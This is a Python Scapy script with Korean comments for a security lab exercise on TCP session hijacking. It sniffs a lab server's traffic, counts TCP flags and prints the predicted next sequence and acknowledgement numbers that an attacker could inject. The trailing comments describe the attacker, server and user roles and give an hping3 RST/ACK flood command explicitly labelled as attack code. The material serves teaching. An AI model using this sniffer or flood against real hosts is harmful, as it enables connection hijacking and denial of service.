from scapy.all import sniff, IP, TCP

# 실습 통계를 위한 누적 카운터 변수
stats = {
    "total_packets": 0,
    "ack_count": 0,
    "syn_count": 0,
    "rst_count": 0
}

def trace_sequence_numbers(packet):
    if packet.haslayer(TCP) and packet.haslayer(IP):
        ip_layer = packet[IP]
        tcp_layer = packet[TCP]
        payload_len = len(tcp_layer.payload)

        # 분석용 실시간 누적 카운트 증가
        stats["total_packets"] += 1
        
        # TCP 헤더 플래그 문자열 검사 ('A'=ACK, 'S'=SYN, 'R'=RST)
        flags_str = str(tcp_layer.flags)
        if "A" in flags_str:
            stats["ack_count"] += 1
        if "S" in flags_str:
            stats["syn_count"] += 1
        if "R" in flags_str:
            stats["rst_count"] += 1

        # ACK Ratio(비율) 계산 (0 나누기 방지 예외 처리)
        if stats["total_packets"] > 0:
            ack_ratio = stats["ack_count"] / stats["total_packets"]
        else:
            ack_ratio = 0.0

        # TCP 흐름 제어: 서버가 수용할 차기 기대 시퀀스 번호 계산
        next_expected_seq = tcp_layer.seq + payload_len

        # 모니터링 대시보드 출력
        print("\n" + "="*50)
        print(f"[포착] {ip_layer.src}:{tcp_layer.sport} -> {ip_layer.dst}:{tcp_layer.dport}")
        print(f" 현재 SEQ  : {tcp_layer.seq} | 데이터 크기: {payload_len} bytes")
        print(f"🎯 차기 SEQ 예측값: {next_expected_seq}")
        print(f"🎯 차기 ACK 예측값: {tcp_layer.ack}")
        print("-"*50)
        print(f"📊 실시간 누적 분석 통계 (총 패킷: {stats['total_packets']}개)")
        print(f"   └─ SYN 개수 : {stats['syn_count']}개")
        print(f"   └─ RST 개수 : {stats['rst_count']}개")
        print(f"   └─ ACK 개수 : {stats['ack_count']}개")
        print(f"   ✨ ACK Ratio : {ack_ratio:.2%}")
        print("="*50)

if __name__ == "__main__":
    # [💡 핵심 보완] 방어용 서버 IP(192.168.72.132)와 포트(9999)가 연관된 TCP 트래픽만 수집하도록 하단 필터 강제 고정
    TARGET_FILTER = "tcp and host 192.168.72.132 and port 9999"
    
    print(f"[*] 22버전 호스트: 타깃 서버[{TARGET_FILTER}] 전용 분석 엔진 가동...")
    sniff(filter=TARGET_FILTER, prn=trace_sequence_numbers)




# 실습 및 사용 방법


# 총 3개의 터미널 필요 (우분투26, 우분투24, 우분투22)

# 1. [터미널 ① : 서버 역할] 통신 대기 상태 만들기 
# 우분투 서버 계정에서 임의의 포트를 열고 사용자의 접속을 기다립니다
# nc -l -p 9999

# 2. [터미널 ② : 공격자 역할] 제시된 Python 스크립트 실행
# 터미너스로 접속한 공격자 계정에서 앞서 안내해 드린 trace_sequence_numbers 스크립트를 파일(trace.py)로 저장한 뒤 관리자 권한으로 실행합니다.
# (패킷 캡처를 위해 대기 상태로 들어갑니다.)
# sudo python3 trace.py

# 3. [터미널 ③ : 사용자 역할] 서버에 접속하여 대화 시도 
# 정상 사용자 계정에서 서버(터미널 ①)의 IP와 포트로 접속한 뒤, 아무 글자나 타이핑하고 엔터(Enter)를 누릅니다.
# # 예시 IP입니다. 실제 서버 IP를 적어주세요.
# nc 192.168.10.20 9999
# 접속 후 입력
# hello server!

# 결과 확인 및 보안 학습 포인트

# ==================================================
# [📡 패킷 포착] 192.168.10.10:54321 -> 192.168.10.20:9999
#  현재 SEQ : 10000
#  데이터 크기: 14 bytes
# --------------------------------------------------
# 🎯 공격자가 주입 시 성공 가능한 차기 SEQ 예측값: 10014
# 🎯 공격자가 주입 시 성공 가능한 차기 ACK 예측값: 50001
# ==================================================



# 공격코드 : sudo hping3 -R -A -p 9999 192.168.72.132 --faster --count 5000

# 실습 마무리 -> 서버 (우분투24) : sudo ufw enable 방화벽 활성